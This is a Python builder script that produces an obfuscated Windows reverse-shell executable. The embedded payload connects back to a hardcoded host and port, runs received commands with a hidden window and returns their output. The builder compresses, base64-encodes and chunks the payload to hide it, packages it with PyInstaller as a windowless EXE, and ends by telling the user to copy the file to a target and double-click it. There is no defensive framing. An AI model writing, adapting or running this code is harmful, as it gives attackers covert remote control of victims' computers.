import zlib
import base64
import subprocess
import os
import sys
import shutil

LHOST = "192.168.178.130"
LPORT = 4444

print("Preparing obfuscated payload...")

payload = f'''

import socket, subprocess, sys, os

HOST = "{LHOST}"
PORT = {LPORT}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            return s
        except:
            import time
            time.sleep(3)

s = connect()
s.send(b"[+] Connected!\\r\\n")

while True:
    try:
        data = s.recv(4096)
        if not data:
            break
        cmd = data.decode('cp850').strip()
        if cmd.lower() == "exit":
            break
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                               creationflags=0x08000000)
        out, err = proc.communicate()
        if out or err:
            s.send(out + err + b"\\r\\n")
        else:
            s.send(b"\\r\\n")
    except Exception as e:
        s.send(str(e).encode('cp850') + b"\\r\\n")
        break
s.close()
'''

compressed = zlib.compress(payload.encode())
b64_payload = base64.b64encode(compressed).decode()
parts = [b64_payload[i:i+50] for i in range(0, len(b64_payload), 50)]
b64_rejoin = " + ".join([f'"{p}"' for p in parts])

final_script = f'''
import zlib, base64, os, sys
b64 = {b64_rejoin}
exec(zlib.decompress(base64.b64decode(b64)).decode())
'''

with open("payload.py", "w", encoding='utf-8') as f:
    f.write(final_script)

print(f"Created payload.py (parts: {len(parts)})")

try:
    import PyInstaller
except ImportError:
    print("PyInstaller not installed. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

icon_file = "Untitled-1.ico"
if not os.path.isfile(icon_file):
    print("Icon file not found, proceeding without icon.")
    icon_arg = []
else:
    icon_arg = ["--icon", icon_file]

print("Building EXE (please wait)...")
subprocess.check_call([
    sys.executable, "-m", "PyInstaller",
    "--onefile",
    "--noconsole",
    *icon_arg,
    "payload.py"
])

if os.path.exists("dist/payload.exe"):
    shutil.move("dist/payload.exe", "payload.exe")
    print("Executable created: payload.exe")
else:
    print("Error building EXE")

shutil.rmtree("build", ignore_errors=True)
shutil.rmtree("dist", ignore_errors=True)
shutil.rmtree("__pycache__", ignore_errors=True)
for f in ["payload.spec"]:
    try: os.remove(f)
    except: pass

print("\nDone successfully!")
print(f"Payload connects to {LHOST}:{LPORT}")
print("Copy payload.exe to target and run (double-click)")